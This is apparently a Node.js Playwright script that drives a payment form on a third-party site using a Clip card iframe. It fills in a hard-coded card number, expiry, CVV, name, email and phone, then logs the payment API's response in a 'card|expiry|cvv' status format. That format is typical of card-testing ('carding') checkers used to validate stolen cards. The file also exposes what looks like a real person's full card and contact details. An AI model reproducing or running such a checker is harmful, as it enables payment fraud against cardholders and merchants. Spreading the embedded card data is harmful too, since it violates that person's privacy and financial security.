const { chromium } = require("playwright");
const { isLuhnValid } = require("../src/helps/index.js");
// const fs = require('fs');

async function pruevas() {
  try {
    const cardNumber = "4268070338514542"
    const cardExpiry = "06/26"
    const cardCvv = "617"
    const cardName = "juan jose gamez ruiz"
    const email = "juanjoseamapa@gmail.com"
    const phoneNumber = "6673837363"

    const isCardNumberValid = isLuhnValid(cardNumber);
    if (!isCardNumberValid) {
      return console.log("Card number invalid")
    }

    const browser = await chromium.launch({ headless: false, });
    const context = await browser.newContext();
    const page = await context.newPage();

    page.on('response', async response => {
      if (response.request().method().includes('POST')) {
        if (response.url().includes('https://api.payclip.com/payments')) {
          const data = await response.json();
          if (data) {
            const cardError = data?.status
            const message = data?.status_detail?.message
            const result = {
              card: `${cardNumber}|${cardExpiry.replace("/", "|")}|${cardCvv}`,
              status: cardError,
              message: message
            }
            await page.close();
            await browser.close();
            // return res.json(result);
            console.log(result)
          }
        }
      }
    });

    await page.goto('https://mobile-check-app-multi.netlify.app/charges', {
      waitUntil: 'domcontentloaded'
    });
    await page.waitForTimeout(3000);
    const iframe = await page.frame({ url: 'https://elements.clip.mx/elements/card#token=7dc98a01-6128-44c0-80c5-42d44363d92a&env=prod&locale=es&installments=false&amount=undefined' })
    if (iframe) {
      await iframe.locator("input[id='cardNumber']").fill(cardNumber)
      await page.waitForTimeout(1000)
      await iframe.locator("input[id='cardExpirationDate']").fill(cardExpiry)
      await page.waitForTimeout(1000)
      await iframe.locator("input[id='cardCvv']").fill(cardCvv)
      await page.waitForTimeout(1000)
      await iframe.locator("input[id='cardName']").fill(cardName)
      await page.waitForTimeout(1000)
      await page.locator("input[id='email']").fill(email)
      await page.waitForTimeout(1000)
      await page.locator("input[id='phone']").fill(phoneNumber)
      // await page.locator("button[id='submit']").click()
    }
    try {
      const response = await page.waitForResponse(response => response.url() === 'https://api.payclip.com/payment' && response.request().method() === 'POST',
        { timeout: 5000 });
      // console.log(response)
    } catch (error) {
      if (error?.name === "TimeoutError") {
        console.error('La respuesta no llegó a tiempo.', error.name);
        await browser.close();
        const res = {
          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
          status: 'TimeoutError'
        }
        console.log(res)
        // return res.json({
        //   card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
        //   status: 'TimeoutError'
        // });
      } else {
        console.error('Error inesperado:', error);
      }
    }
  } catch (error) {
    console.log(error);
  }
}
pruevas();
